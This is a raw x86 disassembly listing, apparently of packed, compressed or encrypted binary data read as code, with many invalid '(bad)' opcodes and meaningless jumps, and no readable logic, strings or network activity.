  41e610:	xchg   DWORD PTR [edx-0x13b0c3d7],edi
  41e616:	add    DWORD PTR [eax+ecx*2+0x5a],esp
  41e61a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e61b:	aaa    
  41e61c:	cmp    DWORD PTR [ebx+0x7e],esp
  41e61f:	pop    esp
  41e620:	sar    DWORD PTR [ecx+0x4d],cl
  41e623:	adc    DWORD PTR ds:0x3948053c,ebp
  41e629:	dec    esi
  41e62a:	mul    BYTE PTR [ebp+edi*8-0x4c]
  41e62e:	fdecstp 
  41e630:	or     eax,0x46b6268c
  41e635:	cmp    eax,0x907020a3
  41e63a:	cmp    DWORD PTR [edx+ecx*4+0x3f720e52],0x1a6fba7a
  41e645:	push   esp
  41e646:	sub    DWORD PTR [edi-0x60],0x488b3381
  41e64d:	push   edx
  41e64e:	jle    0x41e612
  41e650:	jmp    0x8aa26a11
  41e655:	dec    esp
  41e656:	(bad)  
  41e657:	adc    BYTE PTR [ecx+eax*4+0x6f],ah
  41e65b:	dec    BYTE PTR [esi-0x6e]
  41e65e:	aaa    
  41e65f:	imul   ebx,DWORD PTR [esi-0x4],0xab3c085c
  41e666:	(bad)  
  41e667:	lea    eax,[edi-0x777110ec]
  41e66d:	pop    ebx
  41e66e:	push   0xffffffb1
  41e670:	retf   
  41e671:	imul   edi,esi,0xffffff9e
  41e674:	pop    es
  41e675:	loopne 0x41e675
  41e677:	sub    cl,BYTE PTR [ecx+ebx*2+0x96af8ef]
  41e67e:	popa   
  41e67f:	or     edx,DWORD PTR [edi]
  41e681:	cli    
  41e682:	test   BYTE PTR [ebx+0x71eda55d],dh
  41e688:	and    ecx,DWORD PTR ds:[esi]
  41e68b:	jp     0x41e6d2
  41e68d:	inc    ebp
  41e68e:	jl     0x41e69d
  41e690:	pop    edx
  41e691:	pusha  
  41e692:	mov    al,ds:0x8ead3fb4
  41e697:	sbb    esi,DWORD PTR [edi]
  41e699:	dec    BYTE PTR [ebx+0x87fba20]
  41e69f:	xchg   esp,eax
  41e6a0:	call   FWORD PTR [ecx+eiz*2-0x9]
  41e6a4:	leave  
  41e6a5:	mov    ecx,0x3d942dce
  41e6aa:	sbb    DWORD PTR [esp+eax*2+0x6fb934fd],0x30036b3e
  41e6b5:	arpl   WORD PTR [eax+0x6b],ax
  41e6b8:	test   DWORD PTR [edi],eax
  41e6ba:	mov    al,0xb9
  41e6bc:	int    0xc5
  41e6be:	adc    edi,DWORD PTR [ebp+0x44]
	...
  41e734:	and    al,0xce
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx-0x59a68ebe]
  41e744:	sub    al,BYTE PTR [edi+0x1]
  41e747:	add    ch,dh
  41e749:	add    BYTE PTR [eax],al
  41e74b:	add    BYTE PTR [ebx-0x68],dh
  41e74e:	lock lock enter 0xf64a,0xd2
  41e754:	xor    ebx,ecx
  41e756:	test   eax,0xd010cc0a
  41e75b:	push   es
  41e75c:	sar    DWORD PTR [edx+eax*1],1
  41e75f:	push   eax
  41e760:	inc    edi
  41e761:	test   eax,0xe569c6b1
  41e766:	xchg   edx,eax
  41e767:	call   0xa4aa:0x92c5eb0a
  41e76e:	mov    al,ds:0xb037665e
  41e773:	pop    edx
  41e774:	jo     0x41e79b
  41e776:	jbe    0x41e789
  41e778:	into   
  41e779:	cwde   
  41e77a:	aas    
  41e77b:	mov    WORD PTR [edx-0x1742cc58],ss
  41e781:	xor    ch,BYTE PTR [ebx-0x7a1d7121]
  41e787:	jmp    0x41e782
  41e789:	imul   ebx,DWORD PTR [ecx+0x16960fd4],0x12
  41e790:	fsub   QWORD PTR [eax-0x4556da4b]
  41e796:	add    al,0xf6
  41e798:	pop    ecx
  41e799:	les    esi,FWORD PTR [ecx]
  41e79b:	dec    ebx
  41e79c:	xor    ebx,DWORD PTR [ebp-0x7e]
  41e79f:	push   edx
  41e7a0:	mov    ecx,0xde44ca62
  41e7a5:	mov    BYTE PTR [ebp-0x34],dl
  41e7a8:	mov    dl,bl
  41e7aa:	clc    
  41e7ab:	in     al,0x72
  41e7ad:	xlat   BYTE PTR ds:[ebx]
  41e7ae:	dec    bp
  41e7b0:	inc    eax
  41e7b1:	ins    DWORD PTR es:[edi],dx
  41e7b2:	mov    ebx,ss
  41e7b4:	push   0x4b
  41e7b6:	push   cs
  41e7b7:	into   
  41e7b8:	icebp  
  41e7b9:	shr    BYTE PTR [esi+0x7f82be82],1
  41e7bf:	outs   dx,BYTE PTR ds:[esi]
  41e7c0:	cmp    ch,BYTE PTR [ebx+0x5c32b6c8]
  41e7c6:	and    DWORD PTR [edx+eiz*2+0x10a70404],esp
  41e7cd:	jae    0x41e833
  41e7cf:	div    BYTE PTR [edi+esi*2+0x37]
  41e7d3:	add    al,0x9b
  41e7d5:	jge    0x41e77c
  41e7d7:	add    esp,esp
  41e7d9:	in     al,0x8e
  41e7db:	add    bh,bh
  41e7dd:	mov    ds:0x35d40cd0,al
  41e7e2:	or     ah,0xc5
  41e7e5:	loop   0x41e80b
  41e7e7:	mov    bh,0xe3
  41e7e9:	xchg   esi,eax
  41e7ea:	cs push ebx
  41e7ec:	rcl    BYTE PTR [ebx+0x53cf17cd],0xde
  41e7f3:	push   es
  41e7f4:	fcom   QWORD PTR [edi-0x75843c2d]
  41e7fa:	dec    esp
  41e7fb:	xor    eax,ecx
  41e7fd:	mov    ds:0xa80ce18e,al
  41e802:	cli    
  41e803:	mov    ch,0x15
  41e805:	leave  
  41e806:	aas    
  41e807:	sbb    eax,0x8684c87d
  41e80c:	ror    BYTE PTR [ebx],1
  41e80e:	pop    es
  41e80f:	mul    BYTE PTR [esi]
  41e811:	outs   dx,BYTE PTR ds:[esi]
  41e812:	inc    esi
  41e813:	arpl   WORD PTR [ebx-0x76756bbb],ax
  41e819:	mov    ds:0x311d5419,al
  41e81e:	mov    dl,0x5d
  41e820:	outs   dx,DWORD PTR ds:[esi]
  41e821:	mov    ebp,0xbca263dc
  41e826:	ja     0x41e7ee
  41e828:	cmc    
  41e829:	xchg   ebp,eax
  41e82a:	lods   eax,DWORD PTR ds:[esi]
  41e82b:	xchg   ebx,edi
  41e82d:	xor    al,0x14
  41e82f:	jp     0x41e861
  41e831:	into   
  41e832:	lock (bad) 
  41e834:	(bad)  
  41e836:	scas   al,BYTE PTR es:[edi]
  41e837:	mov    ebp,0x2b46d219
  41e83c:	and    DWORD PTR [ecx+0xb53c0a],ecx
	...
  41e8b2:	add    BYTE PTR [eax],al
  41e8b4:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	cwde   
  41e8c1:	call   0x1:0x481f6d9b
  41e8c8:	cmc    
  41e8c9:	add    BYTE PTR [eax],al
  41e8cb:	add    BYTE PTR [ebp+0x10eddd33],dl
  41e8d1:	xchg   ebp,eax
  41e8d2:	xchg   esi,eax
  41e8d3:	jo     0x41e861
  41e8d5:	mov    ch,BYTE PTR [edx-0x6b214cd1]
  41e8db:	push   0x465b06ce
  41e8e0:	shl    BYTE PTR [edi+ebx*4-0x28],1
  41e8e4:	mov    ebp,0xb7067b09
  41e8e9:	vmulss xmm7,xmm5,DWORD PTR [eax+edx*4+0x4]
  41e8ef:	xchg   ebx,eax
  41e8f0:	sbb    esi,DWORD PTR [esi+esi*4]
  41e8f3:	enter  0xf3c2,0x23
  41e8f7:	cmp    eax,0xd9f9495d
  41e8fc:	push   ebp
  41e8fd:	sub    DWORD PTR [ebx+0x5],ebp
  41e900:	das    
  41e901:	popa   
  41e902:	cld    
  41e903:	mov    es,ebx
  41e905:	cmp    edi,DWORD PTR [ecx]
  41e907:	popa   
  41e908:	enter  0xbd2,0x7b
  41e90c:	push   ds
  41e90d:	loopne 0x41e903
  41e90f:	shr    dl,0x83
  41e912:	xor    ecx,ecx
  41e914:	mov    bl,0x59
  41e916:	mov    ch,0x98
  41e918:	ss ins BYTE PTR es:[edi],dx
  41e91a:	cwde   
  41e91b:	lods   eax,DWORD PTR ds:[esi]
  41e91c:	test   eax,0xf8e1dbe2
  41e921:	ret    
  41e922:	pop    ebx
  41e923:	dec    ecx
  41e924:	mov    DWORD PTR [edi+0x668351f5],edx
  41e92a:	mov    edx,0x852ebaa2
  41e92f:	std    
  41e930:	scas   al,BYTE PTR es:[edi]
  41e931:	(bad)  
  41e932:	les    ebp,FWORD PTR [ecx-0x50beddbb]
  41e938:	mov    dh,0x9b
  41e93a:	sbb    dl,dh
  41e93c:	lods   eax,DWORD PTR ds:[esi]
  41e93d:	cmc    
  41e93e:	mov    cs,WORD PTR [edi+0x55]
  41e941:	(bad)  
  41e942:	jo     0x41e8c4
  41e944:	into   
  41e945:	cmp    dl,BYTE PTR [eax]
  41e947:	ret    
  41e948:	(bad)  
  41e949:	pop    ebx
  41e94a:	jo     0x41e915
  41e94c:	mov    dl,BYTE PTR ds:0x9393f1de
  41e952:	das    
  41e953:	out    0xc0,al
  41e955:	(bad)  
  41e956:	jne    0x41e8f9
  41e958:	rcr    BYTE PTR [ebp-0x6d81696f],0x6
  41e95f:	mov    ah,BYTE PTR [eax]
  41e961:	leave  
  41e962:	popf   
  41e963:	xor    al,0xe8
  41e965:	cwde   
  41e966:	pop    edi
  41e967:	or     DWORD PTR [ecx-0x1f],0x1eaa7acd
  41e96e:	sbb    eax,DWORD PTR [edi+0x7beaa0e3]
  41e974:	add    eax,0x74e8fa3e
  41e979:	fsubr  DWORD PTR [ebx+0x1d]
  41e97c:	fadd   QWORD PTR [esi-0x32e2a2d3]
  41e982:	or     eax,edx
  41e984:	or     bh,bh
  41e986:	out    0xbd,al
  41e988:	sub    ecx,esi
  41e98a:	xor    eax,0xae45a69b
  41e98f:	test   BYTE PTR [ebp-0x5f],bl
  41e992:	jmp    0xbc74b20f
  41e997:	mov    eax,ds:0x52629e5d
  41e99c:	retf   0x5a55
  41e99f:	inc    ebp
  41e9a0:	add    eax,0x39a8c19b
  41e9a5:	mov    cl,0xe6
  41e9a7:	fldenv [ebp-0x4f1f504b]
  41e9ad:	or     al,0x24
  41e9af:	pop    ss
  41e9b0:	pop    ecx
  41e9b1:	push   esi
  41e9b2:	(bad)  
  41e9b3:	dec    ebp
  41e9b4:	inc    ebx
  41e9b5:	pop    eax
  41e9b6:	xchg   ecx,eax
  41e9b7:	test   DWORD PTR [edx+0x1f30cd7],eax
  41e9bd:	jb     0x41ea12
  41e9bf:	pop    edi
  41e9c0:	push   ecx
	...
  41ea31:	add    BYTE PTR [eax],al
  41ea33:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	fstp   QWORD PTR ds:0x140d4833
  41ea45:	dec    ecx
  41ea46:	add    DWORD PTR [eax],eax
  41ea48:	cmc    
  41ea49:	add    BYTE PTR [eax],al
  41ea4b:	add    BYTE PTR [ebx+0x30ccbf49],al
  41ea51:	xchg   DWORD PTR [edx-0x1d0ec2e5],ebx
  41ea57:	stos   DWORD PTR es:[edi],eax
  41ea58:	out    dx,al
  41ea59:	jl     0x41ea13
  41ea5b:	push   edx
  41ea5c:	inc    ebp
  41ea5d:	adc    BYTE PTR [eax-0x7b],bl
  41ea60:	and    BYTE PTR [edx],ah
  41ea62:	add    BYTE PTR [edi-0x4d],bl
  41ea65:	sbb    esi,DWORD PTR ds:[ebx-0x2]
  41ea69:	outs   dx,DWORD PTR ds:[esi]
  41ea6a:	iret   
  41ea6b:	jl     0x41ea85
  41ea6d:	add    DWORD PTR [ebx+0x2a],edi
  41ea70:	lods   eax,DWORD PTR ds:[si]
  41ea72:	popf   
  41ea73:	jns    0x41ea05
  41ea75:	in     al,dx
  41ea76:	jno    0x41ea9b
  41ea78:	popf   
  41ea79:	jnp    0x41ea84
  41ea7b:	pop    es
  41ea7c:	aaa    
  41ea7d:	imul   ebp,DWORD PTR [ebx-0x6b73eed7],0x4d
  41ea84:	mov    esp,0x3759536f
  41ea89:	fisub  WORD PTR [edi+0x64]
  41ea8c:	or     ebp,DWORD PTR [eax+0x67]
  41ea8f:	pop    esi
  41ea90:	adc    ch,BYTE PTR [ebx+0x2fe75b6b]
  41ea96:	mov    ah,BYTE PTR [edx-0x2e]
  41ea99:	xlat   BYTE PTR ds:[ebx]
  41ea9a:	and    eax,0x840e53b8
  41ea9f:	ja     0x41eaa2
  41eaa1:	and    al,0x5e
  41eaa3:	ins    DWORD PTR es:[edi],dx
  41eaa4:	lock aam 0x80
  41eaa7:	dec    esi
  41eaa8:	jns    0x41eabe
  41eaaa:	loope  0x41eab6
  41eaac:	std    
  41eaad:	mov    eax,ecx
  41eaaf:	push   eax
  41eab0:	scas   al,BYTE PTR es:[di]
  41eab2:	adc    esi,DWORD PTR [edi]
  41eab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eab5:	je     0x41eaeb
  41eab7:	mov    ch,0x8a
  41eab9:	sbb    edx,DWORD PTR [edx-0x19]
  41eabc:	lock fmul QWORD PTR [ebx-0xae8e483]
  41eac3:	sar    DWORD PTR [ecx+0xb],cl
  41eac6:	ss mov edi,0x2a8ad476
  41eacc:	shl    DWORD PTR [ecx-0x74],0xbf
  41ead0:	xchg   edi,eax
  41ead1:	daa    
  41ead2:	out    0x58,al
  41ead4:	push   cs
  41ead5:	scas   eax,DWORD PTR es:[edi]
  41ead6:	ins    DWORD PTR es:[edi],dx
  41ead7:	les    esp,FWORD PTR [eax-0x214125]
  41eadd:	pop    ebp
  41eade:	stc    
  41eadf:	cmc    
  41eae0:	bound  edx,QWORD PTR [ecx-0x24]
  41eae3:	fsub   QWORD PTR [esi+0x47b0a52f]
  41eae9:	clc    
  41eaea:	xlat   BYTE PTR ds:[ebx]
  41eaeb:	imul   ecx,ecx,0x70
  41eaee:	loopne 0x41eb55
  41eaf0:	xchg   ebx,eax
  41eaf1:	mov    cl,0x27
  41eaf3:	inc    esp
  41eaf4:	in     eax,0xda
  41eaf6:	jno    0x41eb4b
  41eaf8:	(bad)  
  41eaf9:	fld    DWORD PTR [eax]
  41eafb:	xor    al,0x30
  41eafd:	js     0x41eae1
  41eaff:	lods   eax,DWORD PTR ds:[esi]
  41eb00:	sub    dl,dl
  41eb02:	pop    esi
  41eb03:	shr    al,0xe2
  41eb06:	data16 test BYTE PTR [esi],bl
  41eb09:	sahf   
  41eb0a:	mov    WORD PTR [edx-0x7686af3f],ds
  41eb10:	into   
  41eb11:	enter  0x3df,0x74
  41eb15:	in     al,dx
  41eb16:	jnp    0x41eab4
  41eb18:	xchg   DWORD PTR [eax],edi
  41eb1a:	sar    esi,cl
  41eb1c:	add    eax,0x43cd002e
  41eb21:	(bad)  
  41eb22:	xchg   esi,eax
  41eb23:	jne    0x41eae0
  41eb25:	jmp    0xdb2aed4a
  41eb2a:	xchg   DWORD PTR [esi],ebx
  41eb2c:	mov    ebx,0xe691bb95
  41eb31:	and    eax,0xda6c0d68
  41eb36:	jb     0x41eb4b
  41eb38:	jle    0x41eb52
  41eb3a:	dec    eax
  41eb3b:	gs repnz and al,0x69
  41eb3f:	fabs   
	...
  41ebb1:	add    BYTE PTR [eax],al
  41ebb3:	add    BYTE PTR [edi-0x36],ch
  41ebb6:	adc    eax,0xefdfb598
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	push   esp
  41ebc1:	cmp    ecx,DWORD PTR [ebx]
  41ebc3:	mov    ah,0x9
  41ebc5:	dec    edx
  41ebc6:	add    DWORD PTR [eax],eax
  41ebc8:	cmc    
  41ebc9:	add    BYTE PTR [eax],al
  41ebcb:	add    BYTE PTR [esi],ah
  41ebcd:	jmp    0x3091dfe0
  41ebd2:	lods   al,BYTE PTR ds:[esi]
  41ebd3:	xor    eax,0xd06513ea
  41ebd8:	retf   
  41ebd9:	adc    eax,0x9b0fed7c
  41ebde:	leave  
  41ebdf:	ficomp WORD PTR [edx+0x1e]
  41ebe2:	pusha  
  41ebe3:	ret    0x5c32
  41ebe6:	stc    
  41ebe7:	push   esi
  41ebe8:	int    0x5e
  41ebea:	outs   dx,BYTE PTR ds:[esi]
  41ebeb:	mov    edx,0xf7218a84
  41ebf0:	mov    cl,0xd9
  41ebf2:	push   es
  41ebf3:	sub    DWORD PTR [ecx+0xcd88923],ecx
  41ebf9:	push   edx
  41ebfa:	in     al,dx
  41ebfb:	xchg   ebx,eax
  41ebfc:	outs   dx,DWORD PTR ds:[esi]
  41ebfd:	xlat   BYTE PTR ds:[ebx]
  41ebfe:	sahf   
  41ebff:	push   0xfffffffc
  41ec01:	int3   
  41ec02:	ret    
  41ec03:	outs   dx,DWORD PTR ds:[esi]
  41ec04:	pop    ebx
  41ec05:	dec    edx
  41ec06:	daa    
  41ec07:	mov    dh,0x42
  41ec09:	mov    ds:0x2ee9fb21,eax
  41ec0e:	loop   0x41ebf9
  41ec10:	out    dx,eax
  41ec11:	sqrtps xmm5,XMMWORD PTR [ebp+0x3a]
  41ec15:	or     bl,BYTE PTR [edi+edi*4]
  41ec18:	js     0x41ec16
  41ec1a:	mov    esi,0x63749d40
  41ec1f:	pop    eax
  41ec20:	daa    
  41ec21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec22:	sub    esi,ebx
  41ec24:	(bad)  
  41ec26:	mov    eax,ds:0x9810ec49
  41ec2b:	mov    al,0x14
  41ec2d:	(bad)  
  41ec2e:	pop    ebx
  41ec2f:	fmul   DWORD PTR [edi+0x39]
  41ec32:	cmp    ebx,DWORD PTR [ebx-0x7a]
  41ec35:	sbb    DWORD PTR [esi+ecx*8],edx
  41ec38:	add    eax,0xcc2c7eef
  41ec3d:	lods   al,BYTE PTR ds:[esi]
  41ec3e:	or     esp,esi
  41ec40:	mov    ebp,cs
  41ec42:	jmp    FWORD PTR ds:0xa70e7432
  41ec48:	or     DWORD PTR [edi-0x5a627f22],edi
  41ec4e:	lds    esi,FWORD PTR [ebp+0x70]
  41ec51:	(bad)  
  41ec52:	push   edx
  41ec53:	out    dx,eax
  41ec54:	fs mov esi,0xe3f3a765
  41ec5a:	scas   eax,DWORD PTR es:[edi]
  41ec5b:	add    cl,BYTE PTR [esi-0x377949b2]
  41ec61:	inc    ecx
  41ec62:	or     DWORD PTR [ecx],esi
  41ec64:	sbb    BYTE PTR [eax],dl
  41ec66:	test   eax,0xc05cc701
  41ec6b:	dec    ebp
  41ec6c:	mov    al,ds:0x455da4a
  41ec71:	pushf  
  41ec72:	sar    DWORD PTR [esi],1
  41ec74:	out    dx,eax
  41ec75:	cwde   
  41ec76:	sti    
  41ec77:	loope  0x41ecc0
  41ec79:	je     0x41ec82
  41ec7b:	fnsave [edx+ebp*8-0x3632b0e4]
  41ec82:	pusha  
  41ec83:	mul    DWORD PTR [ebx]
  41ec85:	imul   eax,DWORD PTR [esi+0x624cf642],0x8971b67e
  41ec8f:	or     DWORD PTR [eax+0x36],edx
  41ec92:	sub    cl,ah
  41ec94:	(bad)  
  41ec96:	jg     0x41ecc2
  41ec98:	out    dx,eax
  41ec99:	std    
  41ec9a:	xchg   BYTE PTR [edi-0x438d072b],bl
  41eca0:	addr16 inc ecx
  41eca2:	(bad)  
  41eca3:	lock imul ecx,ebp,0x4b934568
  41ecaa:	stos   DWORD PTR es:[edi],eax
  41ecab:	or     DWORD PTR [ecx+0x3bdcbe2c],esi
  41ecb1:	jmp    0x6981:0x5ce7ec02
  41ecb8:	ret    
  41ecb9:	sub    al,0x4b
  41ecbb:	out    0xa0,al
  41ecbd:	jmp    0x41ecc2
  41ecbf:	shr    DWORD PTR [edx+0x0],cl
	...
  41ed31:	add    BYTE PTR [eax],al
  41ed33:	add    BYTE PTR [eax],ah
  41ed35:	repz das 
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	(bad)  
  41ed43:	push   ecx
  41ed44:	dec    BYTE PTR [edx+0x1]
  41ed47:	add    ch,dh
  41ed49:	add    BYTE PTR [eax],al
  41ed4b:	add    BYTE PTR [esp+ecx*1],ch
  41ed4e:	loop   0x41edb1
  41ed50:	push   esi
  41ed51:	dec    DWORD PTR [ecx+0x1e]
  41ed54:	xchg   ecx,eax
  41ed55:	push   0xba8d1bc7
  41ed5a:	add    ebp,DWORD PTR [edi+ecx*8-0x59281e86]
  41ed61:	adc    al,0x7d
  41ed63:	jp     0x41ed3c
  41ed65:	dec    esp
  41ed66:	jnp    0x41ed11
  41ed68:	push   ebp
  41ed69:	mov    ch,0xf5
  41ed6b:	retf   
  41ed6c:	jbe    0x41ed5f
  41ed6e:	imul   edx,DWORD PTR [eax],0x30a8ccd4
  41ed74:	mov    cl,0x49
  41ed76:	push   edi
  41ed77:	mov    edx,DWORD PTR [edx]
  41ed79:	mov    DWORD PTR [ebp-0x7e],ebp
  41ed7c:	pop    ecx
  41ed7d:	mov    BYTE PTR [esi+0x60],ch
  41ed80:	shl    dh,cl
  41ed82:	test   DWORD PTR [ebx-0x62],esp
  41ed85:	or     bl,BYTE PTR [esi-0x3b2f6cae]
  41ed8b:	push   ds
  41ed8c:	shl    BYTE PTR [ecx+0x2973769e],1
  41ed92:	jns    0x41ed2c
  41ed94:	push   edi
  41ed95:	js     0x41ed91
  41ed97:	je     0x41ee06
  41ed99:	mov    eax,ds:0x1bc9dc7a
  41ed9e:	adc    eax,0x9c1d2fda
  41eda3:	xor    eax,0xa2d5264d
  41eda8:	sub    BYTE PTR [edx+ecx*8],al
  41edab:	xchg   ebx,eax
  41edac:	mov    ch,0xcd
  41edae:	push   0x6f
  41edb0:	sahf   
  41edb1:	inc    esp
  41edb2:	mov    fs,esi
  41edb4:	(bad)  
  41edb5:	pop    eax
  41edb6:	push   ecx
  41edb7:	jne    0x41ed7d
  41edb9:	scas   al,BYTE PTR es:[edi]
  41edba:	scas   eax,DWORD PTR es:[edi]
  41edbb:	dec    edx
  41edbc:	cmp    DWORD PTR [ecx+edx*8-0x3b0a0959],eax
  41edc3:	push   esp
  41edc4:	xchg   ebp,eax
  41edc5:	aas    
  41edc6:	xchg   edx,eax
  41edc7:	mov    ecx,0x9ca6554f
  41edcc:	pop    esi
  41edcd:	sub    DWORD PTR [esi],edi
  41edcf:	jns    0x41eddf
  41edd1:	mov    edx,0x4d658aef
  41edd6:	mov    ds:0x5d73624b,eax
  41eddb:	test   al,0xad
  41eddd:	mov    dh,BYTE PTR [edi-0x6d]
  41ede0:	xor    al,0x45
  41ede2:	xchg   ebp,eax
  41ede3:	jg     0x82a7e395
  41ede9:	mov    esi,0x36beb3f4
  41edee:	fisubr DWORD PTR [edx+eiz*4+0x1f7af37b]
  41edf5:	or     ah,0xeb
  41edf8:	(bad)  
  41edf9:	retf   0xd40f
  41edfc:	loopne 0x41edd9
  41edfe:	sub    dh,al
  41ee00:	sub    BYTE PTR [eax-0x69a16f3c],ch
  41ee06:	(bad)  
  41ee07:	mov    edx,0xcc05e14
  41ee0c:	add    DWORD PTR [eax+0x52],ebp
  41ee0f:	stos   WORD PTR es:[edi],ax
  41ee11:	jg     0x41ee62
  41ee13:	hlt    
  41ee14:	add    al,0x63
  41ee16:	into   
  41ee17:	mov    al,ds:0xdee21d26
  41ee1c:	fwait
  41ee1d:	xlat   BYTE PTR ds:[ebx]
  41ee1e:	pushf  
  41ee1f:	add    ch,BYTE PTR [edi]
  41ee21:	dec    edi
  41ee22:	dec    edx
  41ee23:	fwait
  41ee24:	(bad)  
  41ee25:	adc    esp,edi
  41ee27:	mov    ebx,0xd6dcc645
  41ee2c:	lea    esi,[edi+0x49]
  41ee2f:	out    0x38,al
  41ee31:	or     DWORD PTR [edi-0x7a44b94c],edx
  41ee37:	sub    bl,ch
  41ee39:	push   esp
  41ee3a:	and    bl,al
  41ee3c:	(bad)  
  41ee3d:	cmc    
  41ee3e:	cdq    
  41ee3f:	dec    esp
  41ee40:	add    BYTE PTR gs:[eax],al
	...
  41eeb3:	add    BYTE PTR [edi],bh
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	(bad)  
  41eec1:	jecxz  0x41eece
  41eec3:	jb     0x41eeb8
  41eec5:	dec    ebx
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	cmc    
  41eec9:	add    BYTE PTR [eax],al
  41eecb:	add    ah,cl
  41eecd:	das    
  41eece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eecf:	jle    0x41eed9
  41eed1:	pusha  
  41eed2:	fdivp  st(4),st
  41eed4:	mov    edx,0x28ff55e
  41eed9:	cmp    BYTE PTR ds:0xe2641ee1,ah
  41eedf:	lods   al,BYTE PTR ds:[esi]
  41eee0:	xor    al,0x7
  41eee2:	push   es
  41eee3:	mov    eax,ds:0xdd35dad9
  41eee8:	add    eax,0x6b0ee270
  41eeed:	fisub  DWORD PTR [ecx]
  41eeef:	imul   esi,DWORD PTR [esi+0x7d46429c],0x63
  41eef6:	cmp    eax,0xd278ad67
  41eefb:	(bad)  
  41eefc:	aam    0x61
  41eefe:	xchg   ebx,eax
  41eeff:	retf   
  41ef00:	cmp    ecx,ebp
  41ef02:	add    al,0x8f
  41ef04:	lods   al,BYTE PTR ds:[esi]
  41ef05:	push   es
  41ef06:	fidiv  WORD PTR [ecx]
  41ef08:	popa   
  41ef09:	pop    sp
  41ef0b:	imul   ebx,DWORD PTR [edx],0x8b48ad5a
  41ef11:	mov    esp,0xe87788f3
  41ef16:	retf   0x273c
  41ef19:	fwait
  41ef1a:	bound  edi,QWORD PTR [esi]
  41ef1c:	shr    DWORD PTR [eax],0xc0
  41ef1f:	dec    esp
  41ef20:	scas   al,BYTE PTR es:[edi]
  41ef21:	pop    edx
  41ef22:	rep outs dx,BYTE PTR ds:[esi]
  41ef24:	shld   DWORD PTR [ebx+0x5164453e],edi,cl
  41ef2b:	(bad)  
  41ef2c:	xlat   BYTE PTR ds:[ebx]
  41ef2d:	(bad)  
  41ef2e:	xor    DWORD PTR [eax],edi
  41ef30:	popf   
  41ef31:	jmp    0xf6719aba
  41ef36:	add    eax,esi
  41ef38:	out    0xc7,al
  41ef3a:	adc    ebx,DWORD PTR [eax+edi*8]
  41ef3d:	inc    eax
  41ef3e:	push   ebx
  41ef3f:	scas   al,BYTE PTR es:[edi]
  41ef40:	sti    
  41ef41:	bound  esi,QWORD PTR [esi-0x54b691ed]
  41ef47:	jae    0x41ef08
  41ef49:	jmp    0x6eeb:0x7cfbbcae
  41ef50:	test   BYTE PTR [edi+ebp*8+0x7f],al
  41ef54:	call   0xb082b9
  41ef59:	sub    bh,BYTE PTR ds:[ecx+0x550bd775]
  41ef60:	mov    bh,0x47
  41ef62:	jmp    0xa21ba327
  41ef67:	jp     0x41ef53
  41ef69:	(bad)  
  41ef6a:	or     dl,BYTE PTR [esp+esi*4+0x2c]
  41ef6e:	or     al,0xae
  41ef70:	or     al,0x60
  41ef72:	ss dec ebp
  41ef75:	stos   BYTE PTR es:[edi],al
  41ef76:	cmp    esi,DWORD PTR [ecx+edi*2]
  41ef79:	(bad)  
  41ef7a:	add    dl,BYTE PTR gs:[ecx+0x7c]
  41ef7e:	mov    dh,0xee
  41ef80:	push   ebp
  41ef81:	in     eax,0x61
  41ef83:	das    
  41ef84:	dec    eax
  41ef85:	push   ebx
  41ef86:	sub    al,dl
  41ef88:	jbe    0x41ef27
  41ef8a:	daa    
  41ef8b:	div    ebx
  41ef8d:	call   0xd8cf:0x8983915d
  41ef94:	mov    eax,ds:0x40b441a
  41ef99:	xchg   ebx,eax
  41ef9a:	push   esi
  41ef9b:	jne    0x41ef31
  41ef9d:	jmp    0x41eff9
  41ef9f:	mov    BYTE PTR [edi-0x38],bh
  41efa2:	xor    bl,0xe2
  41efa5:	pop    ecx
  41efa6:	pop    es
  41efa7:	dec    edx
  41efa8:	xor    esp,eax
  41efaa:	adc    bh,dh
  41efac:	dec    ecx
  41efad:	call   0x92398055
  41efb2:	ja     0x41efa9
  41efb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efb5:	call   0x5d3:0xcefd6cc8
  41efbc:	mov    fs,WORD PTR [ebp+0xc190f1]
	...
  41f032:	add    BYTE PTR [eax],al
  41f034:	dec    edi
  41f035:	push   ebx
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4+0x30]
  41f041:	pop    ebp
  41f042:	lock pop es
  41f044:	call   0xf541f195
  41f049:	add    BYTE PTR [eax],al
  41f04b:	add    BYTE PTR [edx+0x3f],dl
  41f04e:	adc    BYTE PTR [edx-0x59ce0645],ah
  41f054:	jbe    0x41efd6
  41f056:	or     ebx,ecx
  41f058:	repnz int3 
  41f05a:	test   eax,0xa3d24572
  41f05f:	mov    eax,0x4bb81c81
  41f064:	cdq    
  41f065:	and    al,0x6e
  41f067:	lock aam 0x3a
  41f06a:	pop    ebp
  41f06b:	xchg   esi,eax
  41f06c:	xor    eax,0x30f45f2b
  41f071:	jecxz  0x41f0c5
  41f073:	aas    
  41f074:	and    ebp,DWORD PTR [ecx]
